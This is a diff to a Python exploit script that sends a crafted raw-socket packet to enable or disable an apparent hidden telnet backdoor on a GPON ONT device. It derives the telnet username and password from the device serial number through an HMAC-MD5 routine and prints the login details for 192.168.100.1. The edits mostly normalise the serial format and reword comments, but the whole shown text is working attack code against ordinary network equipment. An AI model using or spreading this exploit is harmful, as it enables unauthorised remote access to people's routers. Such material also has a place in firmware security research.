@@ -28,11 +28,11 @@ if len(sys.argv[2]) != 12:
         print("Invalid PON SN, Expected format AAAAbbbbbbbb")
         sys.exit(1)
 
+gpon_sn = gpon_sn[0:4].upper() + gpon_sn[4:12].lower()
 
 if sys.argv[1] != "enable" and sys.argv[1] != "disable":
         print('First argument must be "enable" or "disable" ')
         sys.exit(1)
-
 
 payload = b''
 # See NetMgt sub_40A2E4
@@ -40,13 +40,12 @@ if( sys.argv[1] == "disable"):
         payload = ( MAC_DATA + b'\xdd\xdd\x00\x00\x00\x00\x00\x00\x00\x00' + bytes(gpon_sn, "utf8")[::-1] +  bytes.fromhex("000000000000000000000000") + b'a'*32 )
 if( sys.argv[1] == "enable" ):
         payload = ( MAC_DATA + b'\xee\xee\x00\x00\x00\x00\xff\xff\xff\xff' + bytes(gpon_sn, "utf8")[::-1] +  bytes.fromhex("000000000000000000000000") + b'a'*32 )
-        # Note that i ran "#ONT/system/misc>admin_en set 1" before testing this so backdoor might not work unless you do it aswell, there might be a VOS_SendMsg in NetMgr call that enables it for you but thats for you to test...
-        telnet_usr = gpon_sn[0:4].upper() + gpon_sn[4:12].lower() 	# Must be AAAAbbbbbbbb
-        pass_sn = gpon_sn.upper()					# Must be AAAABBBBBBBB
+        # Note that i ran "#ONT/system/misc>admin_en set 1" before testing this so backdoor might not work unless you do it aswell.
+	# There might be a VOS_SendMsg in NetMgr call that enables it but thats for you to test...
+        telnet_usr = gpon_sn 		# Must be AAAAbbbbbbbb
+        pass_sn = gpon_sn.upper()	# Must be AAAABBBBBBBB
         telnet_pass = vos_hmac_md5_ssh(pass_sn, 8)
         print(f"Try login at 192.168.100.1\nUsername: {telnet_usr}\nPassword: {telnet_pass}\n")
 
 rawSocket.send(payload)
 rawSocket.close()
-
-print
